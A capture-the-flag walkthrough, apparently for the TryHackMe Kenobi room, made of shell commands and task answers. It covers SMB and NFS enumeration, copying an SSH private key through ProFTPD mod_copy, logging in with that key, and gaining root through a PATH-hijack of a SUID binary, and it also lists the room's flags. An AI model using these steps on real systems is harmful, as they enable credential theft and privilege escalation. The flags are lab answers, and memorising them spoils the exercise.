# THM - Kenobi

<br>

## Task 1

### Task 1.2

```shell
mkdir scans
nmap -A -sC 10.10.190.181 -oN scans/nmap_1.txt
```

> 7

<br>

## Task 2

### Task 2.1

```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.190.181 -oN scans/nmap_2.txt
```

> 3

### Task 2.2

```shell
smbclient //10.10.190.181/anonymous
	^Enter
	
	ls
```

> log.txt

### Task 2.3

```shell
	exit
	
smbget -R smb://10.10.190.181/anonymous
	^Enter
	
cat log.txt
grep -E 'FTP|' log.txt
grep -E 'key|' log.txt
```

> 21

### Task 2.4

```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.190.181 -oN scans/nmap_3.txt
```

> /var

<br>

## Task 3

### Task 3.1

(Terminal 1:)
```shell
nc 10.10.190.181 21
```

> 1.3.5

### Task 3.2

(Terminal 2:)
```shell
searchsploit proftpd 1.3.5
```

> 4

### Task 3.3

http://www.proftpd.org/docs/contrib/mod_copy.html

### Task 3.4

(Terminal 1/nc:)
```shell
	SITE CPFR /home/kenobi/.ssh/id_rsa
	SITE CPTO /var/tmp/id_rsa
```

### Task 3.5

(Terminal 2:)
```shell
mkdir /tmp/kenobiNFS
sudo mount 10.10.190.181:/var /tmp/kenobiNFS
ls -la /tmp/kenobiNFS

cp /tmp/kenobiNFS/tmp/id_rsa ./

sudo chmod 600 id_rsa

sudo ssh -i id_rsa kenobi@10.10.190.181
	yes
	
	ls
	cat user.txt
```

> d0b0f3f53b6caa532a83915e19224899

<br>

## Task 4

### Task 4.1

(Terminal 2/ssh:)
```shell
	find / -perm -u=s -type f 2>/dev/null
```

> /usr/bin/menu

### Task 4.2

(Terminal 2/ssh:)
```shell
	/usr/bin/menu
		1
```

> 3

### Task 4.3

(Terminal 2/ssh:)
```shell
	echo /bin/sh > /tmp/curl
	chmod 777 /tmp/curl
	export PATH=/tmp:$PATH
	/usr/bin/menu
		1
	
			whoami
```

### Task 4.4

(Terminal 2/ssh:)
```shell
			cat /root/root.txt
```

> 177b3cd8562289f37382721c28381f02

<br>

